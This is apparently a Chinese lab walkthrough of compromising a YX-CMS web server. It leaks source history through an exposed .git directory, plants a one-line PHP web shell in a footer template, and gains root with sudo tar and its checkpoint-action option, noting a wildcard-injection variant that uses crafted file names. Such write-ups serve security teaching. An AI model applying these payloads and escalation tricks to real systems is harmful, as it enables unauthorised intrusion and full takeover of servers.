**环境**：靶机 10.10.1.200（YX-CMS 企业门户），攻击机 Kali 10.10.1.186。

### **<span style="color:#3498db">信息收集</span>**

nmap 扫出 22 和 80；后台登录页试了万能密码和爆破 admin 密码都没结果。换字典重新扫目录，这次爆出了一个大东西——**`/.git/`**：

![mm](/assets/img/2025-06-24-19-46-46.png)
![mm](/assets/img/2025-06-25-09-07-49.png)

`.git` 目录能直接访问，意味着**整个代码仓库连同开发历史全部泄露**——不只是当前源码，所有被"删掉"的旧版本也都在里面。

### **<span style="color:#3498db">git-dumper 翻历史</span>**

用 git-dumper 把仓库整个拖下来，然后翻提交记录。重点看"安全加固"这类提交——**加固之前的那一版，往往就是漏洞版**：

```bash
git-dumper http://10.10.1.200/.git/ yx_source
cd yx_source && git log
git show e0fbc3d...    # 安全加固(v1.2)：管理口令改为SHA1哈希存储，移除明文
```

![mm](/assets/img/2025-06-25-09-38-08.png)

从旧版本里翻出了可用的管理口令，直接登录后台。

### **<span style="color:#3498db">后台模板写马</span>**

后台里有个"**站点页脚模板编辑**"功能，能直接改 `templates/footer.php` 的源码。PHP 站点的模板文件本身就是被 `include` 执行的，往里面塞一句话木马，保存即全站生效：

```php
<?php system($_GET['cmd']);?>
```

![mm](/assets/img/2025-06-25-09-45-01.png)

随便访问一个页面带上 `?cmd=id` 就是命令执行，反弹 shell 拿到 www-data：

![mm](/assets/img/2025-06-25-10-02-58.png)

顺便翻到了运维备注：每天有站点打包备份，**备份脚本通过 sudo tar 执行**。

### **<span style="color:#3498db">tar 提权</span>**

`sudo -l` 验证，www-data 可以免密以 root 执行 `/usr/bin/tar`：

![mm](/assets/img/2025-06-25-10-03-36.png)

tar 在打包时有两个危险参数：**`--checkpoint=1`**（打第 1 个文件时触发检查点）配合 **`--checkpoint-action=exec=xxx`**（触发时执行命令）。tar 是以 root 跑的，"执行命令"自然也是 root：

```bash
sudo tar czf 1.tar.gz 1.txt --checkpoint=1 --checkpoint-action=exec='/bin/bash'
```

![mm](/assets/img/2025-06-29-17-24-01.png)
![mm](/assets/img/2025-06-25-10-15-22.png)

另一个更阴的变体：把参数**做成文件名**放在目录里（`--checkpoint=1`、`--checkpoint-action=exec=...`）。当备份脚本用通配符 `tar ... *` 打包时，这些"文件名"会被 tar 当参数解析，等于远程给定时任务塞参数——适合只存在定时打包、没有交互式 sudo 的场景。

root 到手。
